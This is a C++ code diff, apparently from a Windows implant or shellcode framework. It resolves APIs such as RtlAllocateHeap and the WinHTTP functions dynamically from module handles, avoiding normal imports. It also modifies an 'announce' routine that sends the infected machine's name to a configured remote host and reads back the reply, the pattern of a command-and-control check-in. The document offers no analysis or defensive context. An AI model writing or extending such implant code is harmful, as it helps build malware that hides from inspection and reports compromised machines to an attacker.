@@ -32,16 +32,17 @@ Machine::Machine(uintptr_t kernel32_handle) {
 
 class Net {
 public:
-    Net(uintptr_t kernel32_handle, uintptr_t user32_handle, uintptr_t winhttp_handle, const wchar_t* host, uint32_t port);
+    Net(uintptr_t ntdll_handle, uintptr_t kernel32_handle, uintptr_t user32_handle, uintptr_t winhttp_handle, const wchar_t* host, uint32_t port);
     char* announce(char name[16]);
 
 private:
-    uintptr_t kernel32_handle, user32_handle, winhttp_handle;
+    uintptr_t ntdll_handle, kernel32_handle, user32_handle, winhttp_handle;
     const wchar_t* host;
     uint32_t port;
 };
 
-Net::Net(uintptr_t kernel32_handle, uintptr_t user32_handle, uintptr_t winhttp_handle, const wchar_t* host, uint32_t port) {
+Net::Net(uintptr_t ntdll_handle, uintptr_t kernel32_handle, uintptr_t user32_handle, uintptr_t winhttp_handle, const wchar_t* host, uint32_t port) {
+    this->ntdll_handle = ntdll_handle;
     this->kernel32_handle = kernel32_handle;
     this->user32_handle = user32_handle;
     this->winhttp_handle = winhttp_handle;
@@ -51,7 +52,8 @@ Net::Net(uintptr_t kernel32_handle, uintptr_t user32_handle, uintptr_t winhttp_h
 
 char* Net::announce(char name[16]) {
 	decltype(GetProcessHeap) *get_process_heap = RESOLVE_API(this->kernel32_handle, GetProcessHeap);
-	decltype(HeapAlloc) *heap_alloc = RESOLVE_API(this->kernel32_handle, HeapAlloc);
+	// decltype(HeapAlloc) *heap_alloc = RESOLVE_API(this->kernel32_handle, HeapAlloc);
+	decltype(RtlAllocateHeap) *rtl_alloc_heap = RESOLVE_API(this->ntdll_handle, RtlAllocateHeap);
 
 	decltype(wsprintfA) *_wsprintf = RESOLVE_API(this->user32_handle, wsprintfA);
     
@@ -65,9 +67,10 @@ char* Net::announce(char name[16]) {
 	decltype(WinHttpReadData) *win_http_read_data = RESOLVE_API(this->winhttp_handle, WinHttpReadData);
 	decltype(WinHttpCloseHandle) *win_http_close_handle = RESOLVE_API(this->winhttp_handle, WinHttpCloseHandle);
 
-    char json_data[32];
-    int chars_written_json_data = _wsprintf(json_data, "{\"name\":\"%s\"}", name);
-    if (chars_written_json_data <= 0) {
+    char req_data[32];
+    // int chars_written_req_data = _wsprintf(req_data, "{\"name\":\"%s\"}", name);
+    int chars_written_req_data = _wsprintf(req_data, "%s", name);
+    if (chars_written_req_data <= 0) {
         return "1";
     }
 
@@ -98,7 +101,7 @@ char* Net::announce(char name[16]) {
         return "5";
     }
 
-    if (!win_http_send_request(req, WINHTTP_NO_ADDITIONAL_HEADERS, 0, (LPVOID)json_data, chars_written_json_data, chars_written_json_data, NULL)) {
+    if (!win_http_send_request(req, WINHTTP_NO_ADDITIONAL_HEADERS, 0, (LPVOID)req_data, chars_written_req_data, chars_written_req_data, NULL)) {
         return "6";
     }
 
@@ -120,15 +123,18 @@ char* Net::announce(char name[16]) {
     if (!heap) {
         return "get_process_heap";
     }
-    
-    char* resp_data = (char*)heap_alloc(heap, 0, resp_size + 1);
+
+    if (!rtl_alloc_heap) {
+        return "rtl_alloc_heap bad";
+    }
+
+    char* resp_data = (char*)rtl_alloc_heap(heap, HEAP_ZERO_MEMORY, resp_size + 1);
     if (!resp_data) {
         return "heap_alloc_err";
     }
     DWORD bytes_read = 0;
 
     if (!win_http_read_data(req, resp_data, resp_size, &bytes_read)) {
-        // delete[] resp_data;
         return "9";
     }
 
@@ -204,6 +210,7 @@ auto declfn instance::start(_In_ void *arg) -> void {
 	msgbox(nullptr, machine.name, symbol<const char *>("caption"), MB_OK);
 
     Net net(
+        reinterpret_cast<uintptr_t>(ntdll.handle),
         reinterpret_cast<uintptr_t>(kernel32.handle),
         reinterpret_cast<uintptr_t>(user32),
         reinterpret_cast<uintptr_t>(winhttp),
